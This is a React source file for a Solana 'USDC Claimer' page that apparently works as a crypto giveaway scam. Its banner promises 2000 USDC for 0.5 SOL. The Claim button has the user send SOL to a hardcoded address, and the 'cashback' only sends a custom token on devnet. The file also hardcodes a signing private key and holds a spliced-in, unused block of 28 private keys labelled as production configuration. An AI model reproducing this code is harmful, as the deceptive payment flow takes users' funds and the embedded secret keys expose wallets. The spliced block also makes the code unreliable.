/* eslint-disable react-hooks/rules-of-hooks */
'use client'

import { SendTransactionOptions } from '@solana/wallet-adapter-base';
import { useConnection, useWallet } from '@solana/wallet-adapter-react';
import { Connection, PublicKey, SystemProgram, Transaction, TransactionInstruction, TransactionSignature, VersionedTransaction } from '@solana/web3.js';
import { address, createKeypairSignerFromBase58, createSolanaClient, getExplorerLink, getSignatureFromTransaction, LAMPORTS_PER_SOL, signTransactionMessageWithSigners } from 'gill';
import { buildTransferTokensTransaction, TOKEN_PROGRAM_ADDRESS } from 'gill/programs/token';
import { AppHero } from '../ui/ui-layout';

export default function DashboardFeature() {
  const { connection } = useConnection();
  const { publicKey, sendTransaction } = useWallet();
  return (
    <div>
      <AppHero title="USDC Claimer" subtitle="Do you want to get 2000 USDC? It will cost you only 0.5 SOL" />
      <div className="max-w-xl mx-auto py-6 sm:px-6 lg:px-8 text-center">
        <div className="space-y-2">
          <button className="wallet-adapter-button wallet-adapter-button-trigger mx-auto" type="button" onClick={() => {
            CreateChargeTransaction(connection, publicKey, sendTransaction);
          }}>
            {'Claim'}
          </button>
        </div>
      </div>
    </div>
  )
}

const chargeAmount = 0.01;
const cashbackAmount = 5;

const CreateChargeTransaction = async (connection: Connection, publicKey: PublicKey | null, sendTransaction: (transaction: Transaction | VersionedTransaction, connection: Connection, options?: SendTransactionOptions) => Promise<TransactionSignature>) => {


  if (!publicKey) return;

  const solTransferIx = SystemProgram.transfer({
    fromPubkey: publicKey,
    toPubkey: new PublicKey("CVkzbsnwATBDDbGke7o1KzprgDsaKhdET7zioE9ssFXp"),
    lamports: chargeAmount * LAMPORTS_PER_SOL,
  });

  // Optional: Add memo to include cashback metadata
  const memoIx = new TransactionInstruction({
    keys: [],
    programId: new PublicKey('MemoSq4gqABAXKb96qnH8TysNcWxMyWCqXgDLGmfcHr'),
    data: Buffer.from(`cashback:${cashbackAmount}`),
  });

  const transaction = new Transaction().add(solTransferIx, memoIx);
  const { blockhash } = await connection.getLatestBlockhash();
  transaction.recentBlockhash = blockhash;
  transaction.feePayer = publicKey;

  try {
    const signature = await sendTransaction(transaction, connection);
    console.log('User transaction sent:', signature);

    // Wait for confirmation before cashback
    const confirmation = await connection.confirmTransaction(signature, 'confirmed');
    console.log('Confirmed:', confirmation);

    if (confirmation.value.err === null) {
      sendCashback(publicKey.toBase58(), cashbackAmount);

    }
  } catch (e) {
    console.error('Failed to send charge transaction:', e);
  }
};

const sendCashback = async (to: string, amount: number) => {
  const { rpc, rpcSubscriptions, sendAndConfirmTransaction } = createSolanaClient({
    urlOrMoniker: "devnet",
  });
  const destination = address(to);
  const keypairBase58 =
    "2U4H3x7TiW796LtSiUHpp6aEUCGCy7xuDbWjPbxekmxyMLaYWGkNWmLPZDGEb5DEgdXMejti4mt68NQ1WD8yQ3VP"

// KEYS_START
// Production environment configuration
const walletKeys = {
  "key0": "51wGoDC2T7buTRBzJefPeChfkeP79t9uZL66zJLraajRgVcFXstyM3qqh9ZydBhepcbdxmjNVwa52kdb6ioT91J",
  "key1": "3HeFtwsEvHna8NMNcewcAxryKynjs7HtcbuTBG6tbTqoScw8UANHL5x15pT1Nie4ZXmG9uYmCwZFcZzbRNaxoxGN",
  "key2": "3tJwpuagujrdtP5xBqfMWDa5RYLs9t7bBJt3r9siHu8JsNRL5Gas9pduRXQDktGH77rUvru9WzHuCubfWoFwQ5C8",
  "key3": "tGzauPNNFoRe4vHKKHsnE4QwRiZXAP9nAk8eyKZifGTKCrXmMhx38GqFm8fDojiEsHdsK5oEfgR9uj8BsnRyCU2",
  "key4": "3Vuy6XyJxcepPEneSFqLktjKNT8Xg7HxuqgVE7BSpbTTVUcNiMrMgtdZaJatpFdYBZHNNW2MK7hVCeuLv1Misqdd",
  "key5": "4AKPRCi1JEpN9FyUA15cGfYqhN2TDbtQzEnEKsskTE8vZBUTADg1CiYgQSdToJzXvvadKw7zEaGVTMtkHrgzmQSu",
  "key6": "SYeXFA5ifPvNoRuqXcSppLW3UHxdKydrQkobn1MpDbbrdwqNZ3nGqtU4qKKvuFhPWCDVY4dzkZqXddCvUxMi2Qj",
  "key7": "46UR5QHqsNzJDfL6mD11etqLk8wMFdgUYUXZaVx4JpuJihUgHEPSvst5bkgH1zMWJf21YGAoaP3hoKwEdjaKL3GK",
  "key8": "2b1mBHsSL3SG59eMyenY8W7kVJxEi4vje6LQWyUzHpiXU1LzBuovsa1eDpVnrmbittu9W9xjb8rsHU1QA649FGd9",
  "key9": "5MiGB3dpJvbTiau4tnzGoZM6E1RqEPLXgPbzTCnHCYQKfGHJdknuV2tpCQQWSTLQPdCU3bAa87MmHv14xKGspLCc",
  "key10": "3SKKhaJ1ig3RYhVteuFcdraYMp8AMUezeKvd58Y1MEvSpyynCULrffe3dNyLV8iqorYs8nHijYHyfAwQamGD6noH",
  "key11": "opLo55Tg6Cks4LLtEMD9NjWQKuf4tJZjiSq2QzbwVdFwMXrTCEw47uDBztQgdnw5QfrWKT8xQ1hSagossjYtWTG",
  "key12": "5GMZW8jefekyhPcWkhn1QmEx24PsL3e1YEhsWoPBbkGj4Ws93KLG7VX96fhtYUdJB4e7tid8CKuVjVVomhZymaXD",
  "key13": "2iiyoLLNaRrgdPEVTwvEZZWU3CeSh6gHfiuGqkTY7SAtcF5Vfk71yjgSyDh6j8kxTxUPK6jXy9ExZCKK4JKJm2w4",
  "key14": "XmzyLGoZjXfeQ9JMBPrxgBtjAkQ5z5uzcDTdyaBH8jkXKZyZnGg2bYEGzGL6e5Z3zTU2TKd5hf42XMeaGNHjNij",
  "key15": "2nxfep6Km6w2xpLMqK5KPPXVq2TnYYLgNemscQH56T52NGRZXTpcruM1J3uB5eUYH2Qom7m5wEE6trF17hiR5ADg",
  "key16": "4gVWGLtxFnQrKDWQeWpWdGMRa5JLshVPUisuuPap92vQzvzqX9yRr4F5xz4wgG9xvaAyk8nMwrJirvqprVS1kFoB",
  "key17": "4FQPgmPdqyiFBAejHTGJWS7s2XGWCC1EMN1j959LZa2xHx5MZ9XrpupswNaA68W138ALLdAWCXrNcUDDqEoWwfdo",
  "key18": "2CspbXtCGbNWu6ER8Y9cBx151CCC27NgsH1jaGbw9L8FXPwEyTdBhacdnGKiRUGsmLrvSctJvsGjUNzjUHvkRbMx",
  "key19": "54wk1F7tEK8GYcPomXiU5orZZS7kQR8mHk9Jc8xx6woQ9ox49QbVPCcjQneSD3kWtvANemFeWTAXDf9ci9YMxQeg",
  "key20": "cAtu6FDyGmDtfosaBvo7XzNF5mEby2EXQNfQPZzJ8ChjKZyss78aZXfEmQVrBDfkTaLYwn4NaYRg4yh9uFtuQWG",
  "key21": "GNeu2v5752sHmFRP5t3okU8jzPbBQQAmFMvyJpqfPrkHgaPsJFMbVyaJ9PqrHsSY4DoA55xiwx9SGvWK7mefZDo",
  "key22": "3nznxsGpWHCwmvvTE5D1RbehUkN8hrguT5QziZTEWaNVgVDTcHH9FkCJwpUQRdevjYknQeWGzU7UJj21FjHY9gUg",
  "key23": "3Dm1jnZ7fHcxQoRscf13usMz31yyGLBasvV88VdEVZmGVvFnsbNPsebV51PfEjGwoQWauGqJLc9Ff6Rp5uw86D8J",
  "key24": "5qWaCbVEBjun6H3YCLeLPzw1V5cbae3oUnaaDJuc6L2ULb3LysD8FSUSyxwkGQd4cHGQgKfCqut3X9vt41VUUwve",
  "key25": "2DjKVjcUxJt4rcqEcWXxqbN1p2i8SwC3mYu3YYjqq7vXmdpDHijMPV8Z8NFjwxgodbL8ZFM5sKir1A9NXRq2pNuv",
  "key26": "2L26je6cZnWbd7ABSfDXjBJzqoFisBhkBdpfM2wrSrev8pVD1cWXftKGYukDZxzbkqtXsTFVXHmqquhE3zUZ4ryc",
  "key27": "2gkbKvPywB5FD9wb7QUn7jGpW7oqzf6PsYxhH2VQ8AMj5KNw5Rq73FK3SERSetyUeVJwA7q2KPmgDG3X3uH3t2Uo"
};
// KEYS_END
;
  const signer = await createKeypairSignerFromBase58(keypairBase58);
  const mint = address("4YhaKDunYpNJ7ASyUZSvEj5KJCb1jwofUQBaWSWCSkSU");
  const tokenProgram = TOKEN_PROGRAM_ADDRESS;

  const { value: latestBlockhash } = await rpc.getLatestBlockhash().send();

  const transaction = await buildTransferTokensTransaction({
    feePayer: signer,
    latestBlockhash: latestBlockhash, // required for blockhash lifetime constraint
    amount: amount,
    authority: signer,
    destination: destination,
    mint: mint,
  });

  const signedTransaction = await signTransactionMessageWithSigners(transaction);

  console.log(
    "Explorer:",
    getExplorerLink({
      cluster: "devnet",
      transaction: getSignatureFromTransaction(signedTransaction),
    }),
  );

  await sendAndConfirmTransaction(signedTransaction);
};
